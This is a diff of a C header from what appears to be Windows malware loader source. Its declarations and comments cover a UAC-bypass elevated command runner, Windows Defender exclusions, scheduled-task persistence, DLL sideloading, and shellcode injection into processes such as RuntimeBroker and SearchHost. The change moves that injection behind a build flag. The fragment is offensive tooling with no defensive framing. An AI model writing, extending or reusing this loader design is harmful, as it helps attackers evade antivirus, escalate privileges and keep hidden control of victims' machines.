@@ -213,11 +213,12 @@ BOOL  UacRunCommandElevated(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN LPWSTR wSy
 // [UAC only] Also runs WD exclusions + scheduled task via elevated PS.
 VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
 
-// Persistence-reboot injection: writes already-placed shellcode (pShellcode, RX in current
-// process) into a low-CPU target (RuntimeBroker → SearchHost → sihost → dllhost) and
-// calls NtTerminateProcess(-1). Returns FALSE if no target found (caller falls back to
-// thread-pool execution in the current host process).
+// Persistence-reboot injection (opt-in via ENABLE_INJECT): writes already-placed shellcode
+// into a low-CPU target process and calls NtTerminateProcess(-1). Returns FALSE if no
+// target found — main.c falls back to thread-pool execution in the current process.
+#if defined(ENABLE_INJECT)
 BOOL  InjectAndHijack(IN PVOID pShellcode, IN DWORD dwSize);
+#endif
 #endif
 
 // ----------- Persistence (non-UAC builds only) -----------
